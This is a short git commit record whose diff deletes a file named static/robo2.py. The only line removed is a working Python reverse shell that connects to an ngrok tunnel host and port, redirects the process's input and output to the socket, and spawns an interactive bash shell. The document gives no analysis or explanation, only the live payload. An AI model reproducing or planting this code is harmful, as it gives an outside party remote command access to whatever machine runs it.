9065af1caec5d4aef4dc192db0d7d4eb849f70c4
S K Aravind <aravindraghvi@gmail.com>
2021-08-06 16:12:31 -0400

    updates

--- static/robo2.py
+++
@@ -1,1 +0,0 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.ngrok.io",11513));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
